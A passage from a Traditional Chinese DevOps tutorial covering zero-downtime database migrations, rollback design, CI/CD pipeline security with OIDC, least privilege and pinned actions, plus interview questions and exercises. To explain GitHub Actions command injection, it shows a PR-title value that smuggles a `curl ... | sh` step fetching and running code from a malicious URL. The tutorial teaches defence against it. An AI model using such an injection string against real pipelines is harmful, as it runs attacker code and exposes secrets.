<circle cx="129" cy="210" r="5" class="fg-lamp on"/><circle cx="213" cy="210" r="5" class="fg-lamp on"/><circle cx="297" cy="210" r="5" class="fg-lamp on"/><circle cx="381" cy="210" r="5" class="fg-lamp on"/><circle cx="465" cy="210" r="5" class="fg-lamp on"/><circle cx="549" cy="210" r="5" class="fg-lamp on"/><circle cx="633" cy="210" r="5" class="fg-b warm"/>
<text x="381" y="232" text-anchor="middle" class="fg-t sm acc">前六步：退回上一版程式，資料都還在、都看得懂</text>
<text x="633" y="232" text-anchor="middle" class="fg-t sm warm">回不去了</text>
<line x1="90" y1="248" x2="664" y2="248" class="fg-l dim"/><polygon points="672,248 664,243.5 664,252.5" class="fg-a"/>
</svg><figcaption>每一欄是一次獨立的部署，中間可以隔幾天。任何時候出事，退回前一欄的程式都還能正常運作；只有最後的收縮不可逆，所以要等前面全部穩定了才做。</figcaption></figure>
<p>以 PostgreSQL 為例，資料庫那幾步長這樣：</p>
<pre><code>-- 擴張：只加欄位，不加預設值、不加 NOT NULL，幾乎瞬間完成
SET lock_timeout = '3s';
ALTER TABLE players ADD COLUMN nickname text;

-- 回填：分批做，每批幾千筆，避免長交易和一次產生大量 WAL
UPDATE players SET nickname = name
 WHERE id BETWEEN 1 AND 5000 AND nickname IS NULL;

-- 收縮：確認沒有任何程式再讀寫 name 之後
ALTER TABLE players DROP COLUMN name;</code></pre>
<h4>幾個會讓「不停機」破功的細節</h4>
<ul>
<li><b>鎖的排隊</b>：<code>ALTER TABLE</code> 需要整張表的獨佔鎖。如果剛好有一個跑了五分鐘的查詢，它會排在後面等；更糟的是，它後面所有一般的查詢也跟著排隊，整個服務看起來就像當掉。所以先設 <code>lock_timeout</code>，拿不到鎖就放棄、稍後重試，而不是讓大家一起卡住。</li>
<li><b>建索引</b>：一般的 <code>CREATE INDEX</code> 建索引期間會擋住寫入，大表要用 <code>CREATE INDEX CONCURRENTLY</code>。</li>
<li><b>加 NOT NULL</b>：直接加會掃整張表檢查。先加一個 <code>CHECK (nickname IS NOT NULL) NOT VALID</code> 的約束，再另外 <code>VALIDATE</code>，驗證期間不會擋住寫入。</li>
<li><b>遷移在哪裡跑</b>：不要讓每個 Pod 啟動時都去跑遷移，十個 Pod 會同時搶著改結構。在部署前用獨立的一步跑（CI 的一個步驟、Kubernetes Job，或 Helm hook），而且一次只有一個在跑。Flyway、golang-migrate、Prisma Migrate 這類工具都會用一張紀錄表追蹤跑過哪些遷移。</li>
</ul>

<h3><span class="badge lv3">專業</span>七、回復的設計：退版是設計出來的，不是出事才想的</h3>
<p>「出事就退版」說起來簡單，真的要退的時候，常常發現退不回去：舊的映像檔被清掉了、設定已經改了、資料庫結構舊版看不懂。能不能退、退要多久，要在設計時就決定。</p>
<table>
<tr><th>手段</th><th>大約多久</th><th>前提</th></tr>
<tr><td>關掉功能開關</td><td>幾秒</td><td>新功能包在開關裡</td></tr>
<tr><td>流量切回（藍綠、金絲雀中止）</td><td>幾秒</td><td>舊版本還在跑</td></tr>
<tr><td>重新部署上一個 digest</td><td>幾分鐘</td><td>舊映像檔還在倉庫、設定跟著版本走</td></tr>
<tr><td>修好再往前部署（roll forward）</td><td>幾十分鐘以上</td><td>知道原因、管線夠快</td></tr>
<tr><td>從備份還原資料庫</td><td>幾小時</td><td>有備份，而且能接受遺失備份之後的資料</td></tr>
</table>
<ul>
<li><b>先退再查</b>：部署後幾分鐘內錯誤率上升，又找不到其他原因，先退版。查原因可以在服務恢復之後慢慢查，使用者不需要陪你除錯。</li>
<li><b>不能退的東西</b>：已經寄出的信、已經呼叫的金流 API、已經用新格式發到佇列裡的訊息。訊息格式尤其危險：舊版的消費者看不懂新格式，退版反而讓消費端整排報錯。訊息和 API 的格式變更，同樣要走「先讓讀的那一方兩種都看得懂，再讓寫的那一方換新格式」的順序。</li>
<li><b>自動退版</b>：金絲雀工具可以依指標自動中止。滾動更新沒有內建自動退版，要靠部署工具在 <code>rollout status</code> 失敗時自己執行 undo。</li>
<li><b>演練</b>：在 staging 定期真的退一次版。從沒演練過的退版流程，在半夜壓力最大的時候，通常不會順利。</li>
</ul>

<h3><span class="badge lv4">專家</span>八、管線本身的安全</h3>
<p>想像一個攻擊者，他最想拿到什麼？不是某一台伺服器，而是<b>能改變所有伺服器的那個東西</b>。管線有原始碼的寫入權限、有映像檔倉庫的推送權限、有部署到正式環境的雲端權限，它就是那個東西。歷史上幾個最嚴重的事件都打在這裡：SolarWinds（2020）的建置系統被植入後門，簽了名的更新檔送到上萬個客戶；Codecov（2021）的上傳腳本被竄改，在無數 CI 裡偷走環境變數；2025 年 3 月，GitHub Actions 熱門套件 tj-actions/changed-files 的版本標籤被改指向惡意的 commit，讓大量 repo 的 CI 把機密印進日誌。</p>
<h4>第一道：不存長效金鑰，用 OIDC 換臨時憑證</h4>
<p>老做法是把雲端的存取金鑰存在 CI 的機密設定裡。這把金鑰永遠有效，一旦外洩，攻擊者可以用到你發現為止。OIDC 的做法是：CI 每次執行時，向雲端證明「我是哪個 repo、哪個分支的哪個工作」，換一張只活一小時左右的臨時憑證。</p>
<figure class="figure"><svg viewBox="0 0 680 290" class="fg" style="width:100%;max-width:680px" role="img" aria-label="OIDC 流程：GitHub Actions 工作向 GitHub 的 OIDC 發證者要 ID token，拿到含 repo 與分支的簽名 JWT，再向 AWS STS 換角色；STS 驗證簽章與信任政策後發出約一小時的臨時憑證，工作用它推映像檔、部署">
<rect x="30" y="16" width="140" height="32" rx="6" class="fg-b hot"/><text x="100" y="37" text-anchor="middle" class="fg-t">GitHub Actions 工作</text>
<rect x="230" y="16" width="140" height="32" rx="6" class="fg-b"/><text x="300" y="37" text-anchor="middle" class="fg-t">GitHub 的 OIDC</text>
<rect x="410" y="16" width="140" height="32" rx="6" class="fg-b alt"/><text x="480" y="37" text-anchor="middle" class="fg-t">AWS STS</text>
<rect x="580" y="16" width="90" height="32" rx="6" class="fg-b"/><text x="625" y="37" text-anchor="middle" class="fg-t">ECR／EKS</text>
<line x1="100" y1="48" x2="100" y2="282" class="fg-l dim dash"/><line x1="300" y1="48" x2="300" y2="282" class="fg-l dim dash"/><line x1="480" y1="48" x2="480" y2="282" class="fg-l dim dash"/><line x1="625" y1="48" x2="625" y2="282" class="fg-l dim dash"/>
<line x1="100" y1="80" x2="292" y2="80" class="fg-l"/><polygon points="300,80 292,75.5 292,84.5" class="fg-a"/>
<text x="200" y="72" text-anchor="middle" class="fg-t sm">1. 要一張 ID token</text>
<line x1="300" y1="116" x2="108" y2="116" class="fg-l on"/><polygon points="100,116 108,111.5 108,120.5" class="fg-a on"/>
<text x="200" y="108" text-anchor="middle" class="fg-t sm acc">2. 簽名的 JWT（含 repo、分支）</text>
<line x1="100" y1="152" x2="472" y2="152" class="fg-l"/><polygon points="480,152 472,147.5 472,156.5" class="fg-a"/>
<text x="390" y="144" text-anchor="middle" class="fg-t sm">3. 拿 JWT 換角色</text>
<rect x="420" y="166" width="120" height="44" rx="6" class="fg-b warm"/>
<text x="480" y="185" text-anchor="middle" class="fg-t sm warm">4. 驗簽章</text>
<text x="480" y="201" text-anchor="middle" class="fg-t sm">比對 sub、aud</text>
<line x1="480" y1="232" x2="108" y2="232" class="fg-l on"/><polygon points="100,232 108,227.5 108,236.5" class="fg-a on"/>
<text x="200" y="224" text-anchor="middle" class="fg-t sm acc">5. 臨時憑證（約 1 小時）</text>
<line x1="100" y1="268" x2="617" y2="268" class="fg-l alt"/><polygon points="625,268 617,263.5 617,272.5" class="fg-a alt"/>
<text x="552" y="260" text-anchor="middle" class="fg-t sm alt">6. 推映像檔、部署</text>
</svg><figcaption>整個流程裡沒有任何長效的秘密。AWS 只相信兩件事：JWT 真的是 GitHub 簽的，而且 JWT 裡寫的 repo 和分支，符合角色信任政策的條件。</figcaption></figure>
<p>關鍵在第 4 步的條件。AWS 角色的信任政策要寫死「哪個 repo、哪個分支或環境」可以換這個角色：</p>
<pre><code>"Condition": {
  "StringEquals": {
    "token.actions.githubusercontent.com:aud":
      "sts.amazonaws.com",
    "token.actions.githubusercontent.com:sub":
      "repo:example/hilo:environment:production"
  }
}</code></pre>
<p>最常見的錯誤是 <code>sub</code> 寫成萬用字元，例如 <code>repo:example/*</code>，等於這個組織裡任何一個 repo、任何一個分支，甚至某個實習生的實驗專案，都能拿到正式環境的部署權限。上面的例子綁的是 GitHub 的 environment，搭配 environment 的「需要指定的人核准」和「只允許 main 分支」，就形成一道人工閘門。</p>
<h4>第二道：權限最小化與受保護的分支</h4>
<ul>
<li><b>工作流程的預設權限設成最小</b>：在檔案最上面寫 <code>permissions: { contents: read }</code>，需要寫入或 <code>id-token: write</code> 的工作再單獨打開。</li>
<li><b>角色分開</b>：跑 plan 和測試的角色只能讀，只有部署那一步的角色能寫，而且只能寫自己那個服務的資源。</li>
<li><b>受保護的分支</b>：main 必須經過審查才能合併、不能強制推送、必須通過 CI。<code>.github/workflows</code> 目錄用 CODEOWNERS 指定只有平台團隊能核准，因為改工作流程就等於改權限。</li>
</ul>
<h4>第三道：防住針對 CI 的攻擊手法</h4>
<ul>
<li><b>指令注入</b>：工作流程裡寫 <code>run: echo "\${{ github.event.pull_request.title }}"</code>，這個值會在執行前直接貼進 shell 指令。攻擊者把 PR 標題取成 <code>"; curl 惡意網址 | sh; "</code>，你的 CI 就替他執行了。外部可控的值一律先放進環境變數（<code>env:</code>），在指令裡用 <code>"$TITLE"</code> 引用。</li>
<li><b>不受信任的程式碼拿到機密</b>：<code>pull_request_target</code> 這種觸發方式在主分支的權限下執行，如果它又去 checkout 並執行 PR 的程式碼，等於讓陌生人帶著你的機密跑他的程式。來自 fork 的 PR，只能在沒有機密、唯讀的權限下跑。</li>
<li><b>第三方 action 釘死在 commit SHA</b>：<code>uses: some/action@v4</code> 的 <code>v4</code> 是標籤，可以被移動，tj-actions 事件就是這樣發生的。寫成完整的 40 字元 SHA，再用 Dependabot 或 Renovate 幫你更新。</li>
<li><b>相依套件</b>：npm 套件的安裝腳本會在 CI 裡執行，看得到環境變數。用鎖檔和 <code>npm ci</code>，能加 <code>--ignore-scripts</code> 的地方就加，並且只在需要機密的步驟才把機密放進環境。</li>
<li><b>自架的執行機器</b>：公開 repo 不要用自架的 runner，任何人開 PR 都可能在你的機器上執行程式；私有 repo 也最好讓每個工作用完就丟的全新機器，避免上一個工作留下的東西影響下一個。</li>
</ul>

<h3>九、常見誤解</h3>
<table>
<tr><th>誤解</th><th>實際上</th></tr>
<tr><td>同一個 commit 建出來的東西都一樣</td><td>基底映像檔、浮動的套件版本、建置時寫入的設定，都會讓結果不同。只有把同一個檔案往前推才保證一樣。</td></tr>
<tr><td>用 commit ID 當標籤就能確定跑的是什麼</td><td>標籤可以被改指向別的映像檔。要確定，部署時要用 digest，並驗證簽章。</td></tr>
<tr><td>金絲雀開 1% 最安全</td><td>流量太小，統計上分不出好壞，等於沒驗證。比例和時間要讓樣本數夠大。</td></tr>
<tr><td>藍綠部署可以瞬間退版，所以沒風險</td><td>程式能瞬間切回去，資料庫和已經送出的訊息不會。共用資料的相容性才是藍綠的難處。</td></tr>
<tr><td>功能開關越多越靈活</td><td>每個開關都是一條要測的分支。功能穩定後不刪，就變成技術債。</td></tr>
<tr><td>CI 的機密設成不可見就安全了</td><td>任何在 CI 裡執行的程式碼，包括第三方 action 和套件的安裝腳本，都讀得到環境裡的機密。</td></tr>
</table>

<h3>十、跟你的工作連起來</h3>
<ul>
<li><b>Vue／前端</b>：把 <code>VITE_*</code> 這類建置時變數換成啟動時讀取的設定檔，同一個打包結果就能跑在每個環境。端對端測試用 Playwright，只寫最重要的幾條流程，例如登入和完成一局遊戲。</li>
<li><b>Node.js 與 TypeScript</b>：<code>tsc --noEmit</code>、lint、單元測試平行跑；Dockerfile 先複製鎖檔再 <code>npm ci</code>；映像檔用 commit ID 當標籤。這三件事做完，管線就快又可靠。</li>
<li><b>Go 服務</b>：Go 的模組快取（<code>GOMODCACHE</code>）和建置快取（<code>GOCACHE</code>）都值得快取；多階段建置把最後的映像檔縮到只剩一個執行檔，拉得快、攻擊面也小。</li>
<li><b>遊戲客戶端</b>：Cocos 或 Unity 的建置特別慢，快取的價值更大；版本號、資源包和伺服器 API 的相容性也一樣適用 expand-contract：伺服器先能同時服務新舊客戶端，再發布新客戶端，等舊版玩家少到可以接受，才移除舊介面。</li>
<li><b>雲端存取</b>：如果你的 CI 裡還存著長效的雲端金鑰，改成 OIDC 是 CP 值最高的一次資安升級。</li>
</ul>

<h3>十一、面試會怎麼問</h3>
<p>這些是 DevOps、SRE、資深後端面試的常見題目。先出聲講一遍，再打開參考答案。</p>
<ol>
<li>「為什麼要 build once？前端的環境變數在建置時就寫死了，你怎麼讓同一個建置結果跑在三個環境？」</li>
<li>「藍綠部署和金絲雀發布各適合什麼情況？金絲雀的自動分析要看哪些指標？」</li>
<li>「線上系統要把一個欄位改名，請說明步驟，以及每一步出事時怎麼退。」</li>
<li>「部署完五分鐘，錯誤率開始上升。你會先退版還是先查原因？」</li>
<li>「CI 要部署到雲端，你會怎麼給它權限？OIDC 是怎麼運作的？」</li>
<li>「舉一個針對 CI/CD 的供應鏈攻擊，你會怎麼防？」</li>
</ol>
<details class="reveal"><summary>看參考答案</summary>
<ol>
<li>因為同一個 commit 在不同時間建置，可能因為基底映像檔、浮動的套件版本或建置時寫入的設定而得到不同結果，那 staging 的測試就不能代表 prod。前端的做法是把環境相關的值從建置時搬到執行時：應用程式啟動時讀取一份由部署平台提供的設定檔，或由容器的啟動腳本注入，打包檔本身不含環境資訊。然後以 digest 識別這個映像檔，一路晉升到各環境。</li>
<li>藍綠適合需要瞬間切換、瞬間退回，而且能負擔切換期間兩倍資源的情況；金絲雀適合流量夠大、監控成熟，想把壞版本的影響限制在少數使用者的情況。自動分析至少看錯誤率和延遲（例如 p99），最好和同時段、同規模的舊版基準組比較，再加上重要的業務指標，例如登入成功率或每分鐘完成的對局數。也要確保每個階段的樣本數夠大。</li>
<li>用 expand-contract：先加新欄位（不加預設值和 NOT NULL）；部署同時寫兩個欄位、仍讀舊欄位的版本；分批回填舊資料；部署改讀新欄位的版本；部署只寫新欄位的版本；最後確認沒人使用舊欄位才刪除。每一步都是獨立部署，前面任何一步出事，退回上一版程式都還能正常運作；只有刪除欄位不可逆，所以放到最後並先備份。DDL 要設 lock_timeout，避免鎖排隊拖垮服務。</li>
<li>如果錯誤率上升和部署時間吻合，又沒有其他明顯原因，先退版，讓服務恢復，再慢慢查。退版的成本是幾分鐘，邊查邊讓使用者受影響的成本更高。前提是退版是安全的：資料庫結構相容、沒有不可逆的副作用，這是平常設計就要做好的。</li>
<li>不在 CI 存長效金鑰，改用 OIDC。CI 執行時向 GitHub 的 OIDC 發證者拿一張簽名的 JWT，裡面寫著 repo、分支或環境；拿這張 JWT 向 AWS STS 換角色，STS 驗證簽章，並檢查角色信任政策裡的 aud 和 sub 條件，通過才發出大約一小時的臨時憑證。權限方面，每個服務、每個環境一個角色，只給部署需要的動作；sub 綁到特定 repo 和 environment，不用萬用字元。</li>
<li>例如 2025 年 tj-actions/changed-files 的標籤被改指向惡意 commit，引用它的工作流程就把機密印進日誌。防法是把第三方 action 釘在完整的 commit SHA、預設最小權限、只在需要的步驟提供機密、用 OIDC 取代長效金鑰，讓就算外洩的憑證也很快失效。另外也要防指令注入、不讓 fork 的 PR 碰到機密，並對產出的映像檔簽章、在部署時驗證。</li>
</ol>
</details>

<h3>十二、練功題（做得出來才算真的懂）</h3>
<ol>
<li>一個 Dockerfile 依序是 <code>FROM</code>、<code>COPY . .</code>、<code>RUN npm ci</code>、<code>RUN npm run build</code>。<code>npm ci</code> 要 90 秒，build 要 30 秒。你只改了一個 .ts 檔，要多久？重排之後呢？</li>
<li>一個服務每秒 40 個請求，舊版錯誤率 0.2%。金絲雀開 5%、觀察 10 分鐘，預期會看到幾個錯誤？如果新版錯誤率是 1%，你有把握分得出來嗎？</li>
<li>寫出 AWS 角色信任政策裡 <code>sub</code> 的條件：只允許 <code>example/hilo</code> 這個 repo 裡、以 <code>v</code> 開頭的 git 標籤觸發的工作換這個角色。</li>
<li>你要在 <code>players</code> 表加一個必填欄位 <code>region</code>（NOT NULL）。寫出不停機的步驟。</li>
<li>下面這行工作流程有什麼問題？怎麼改？<br><code>run: ./notify.sh "\${{ github.event.issue.title }}"</code></li>
<li>一次發布同時包含：新的映像檔、一個預設關閉的功能開關、一個「加欄位」的遷移。上線後發現新功能有 bug。依序寫出你會怎麼退，以及哪些東西不用退。</li>
</ol>
<details class="reveal"><summary>看答案</summary>
<ol>
<li>原本的順序，原始碼一變，<code>COPY . .</code> 之後全部重建，大約 90 + 30 = 120 秒。改成先 <code>COPY package*.json ./</code>、<code>RUN npm ci</code>，再 <code>COPY . .</code>、<code>RUN npm run build</code>，鎖檔沒變時 <code>npm ci</code> 命中快取，只剩大約 30 秒。</li>
<li>40 × 5% = 每秒 2 個請求，10 分鐘 1,200 個。舊版錯誤率預期 2.4 個錯誤，新版 1% 預期 12 個。差距看得出來，但樣本偏小，偶然出現 6、7 個時就很難判斷。比較穩的做法是把比例提高到 20% 到 25%，或把觀察時間拉長，並和同規模的基準組比較。</li>
<li>標籤觸發的 <code>sub</code> 格式是 <code>repo:example/hilo:ref:refs/tags/v1.2.0</code> 這種樣子，所以用萬用字元比對：<code>StringLike</code>，值是 <code>repo:example/hilo:ref:refs/tags/v*</code>。注意萬用字元只放在標籤名稱那一段，repo 部分仍然寫死。</li>
<li>先加可為空的 <code>region</code> 欄位；部署寫入時一定填 <code>region</code> 的程式；分批回填舊資料；加一個 <code>CHECK (region IS NOT NULL) NOT VALID</code> 約束，再 <code>VALIDATE</code>；確認無誤後，可以再改成真正的 NOT NULL（PostgreSQL 12 起，如果已有驗證過的同義 CHECK 約束，設定 NOT NULL 時可以略過全表掃描）。每一步都設 <code>lock_timeout</code>。</li>
<li>Issue 標題是外部的人可以任意填的，<code>\${{ }}</code> 會在執行前直接把它貼進 shell 指令，造成指令注入。改成先放進環境變數：在這個步驟加上 <code>env:</code>，設定 <code>TITLE: \${{ github.event.issue.title }}</code>，指令寫 <code>./notify.sh "$TITLE"</code>，讓 shell 把它當成一般字串。</li>
<li>第一步關掉功能開關，幾秒內止血，這通常就夠了。映像檔不一定要退，因為新功能已經關著，其他部分如果正常就留著；確定映像檔本身有問題才重新部署上一個 digest。遷移只是加欄位，舊版程式不會讀它，不用也不該急著回滾；等修好 bug、重新打開開關之後，這個欄位還會用到。</li>
</ol>
</details>

<h3>十三、想再挖深</h3>
<ul>
<li><b>Jez Humble、David Farley《Continuous Delivery》</b>（Addison-Wesley）：「只建置一次」「部署管線」這些概念的源頭，到現在還是這個領域最完整的一本書。</li>
<li><b>Nicole Forsgren、Jez Humble、Gene Kim《Accelerate》</b>（IT Revolution）：用多年的調查數據說明哪些交付做法真的跟團隊績效有關，DORA 四大指標就出自這裡。</li>
<li><b>Martin Fowler 網站上的 BlueGreenDeployment、CanaryRelease、ParallelChange 等文章</b>（<a href="https://martinfowler.com/">martinfowler.com</a>）：每篇都很短，把策略的本質講得很清楚。</li>
<li><b>SLSA</b>（<a href="https://slsa.dev/">slsa.dev</a>）：供應鏈安全的等級框架，說明出處證明要做到什麼程度才難以偽造。</li>
<li><b>GitHub Docs：Security hardening for GitHub Actions</b> 與 OpenID Connect 相關章節（<a href="https://docs.github.com/en/actions">docs.github.com</a>）：指令注入、權限設定、OIDC 信任條件的官方說明。</li>
</ul>
` });
